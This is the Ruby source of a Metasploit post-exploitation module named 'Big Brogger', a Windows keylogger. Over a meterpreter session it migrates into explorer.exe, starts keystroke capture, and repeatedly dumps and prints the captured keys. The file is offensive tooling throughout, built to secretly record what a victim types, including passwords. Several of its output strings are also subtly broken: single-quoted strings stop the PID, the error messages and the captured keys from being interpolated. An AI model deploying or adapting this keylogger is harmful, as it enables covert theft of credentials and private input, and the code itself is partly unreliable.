##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Big Brogger',
        'Description' => %q{ Post module to capture all keyboard inputs on a Windows system. },
        'License' => MSF_LICENSE,
        'Author' => ['Tom Dejardin', 'Yohan Bordes'],
        'Platform' => ['windows'],
        'SessionTypes' => ['meterpreter']
      )
    )
  end

  def run
    print_status('Attempting to migrate to explorer.exe...')

    begin
      # Retrieve the process list
      process_list = client.sys.process.get_processes

      # Find the PID of the explorer.exe process
      explorer_pid = process_list.find { |proc| proc['name'] =~ /explorer\.exe/i }['pid']

      # Migrate to explorer.exe process
      client.core.migrate(explorer_pid)

      print_good('Successfully migrated to explorer.exe (PID: #{explorer_pid})')
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error('Error occurred: #{e.message}')
    end

    print_status('Keylogger started...')

    # Start the keyscan capture
    client.ui.keyscan_start

    begin
      loop do
        # Retrieve captured keystrokes
        captured_keys = client.ui.keyscan_dump

        # Print the captured keys
        if captured_keys.present?
          print_status('Captured keys: #{captured_keys}')
        else
          # Sleep for a short duration to avoid high CPU usage
          sleep(0.5)
        end
      rescue Rex::ConnectionError
        print_status('Connection error occurred. Exiting keylogger.')
        break
      end
    rescue Rex::RuntimeError => e
      print_error('Error occurred: #{e.message}')
    ensure
      # Stop the keyscan capture
      client.ui.keyscan_stop
    end

    print_status('[*] Keylogger stopped.')
  end
end
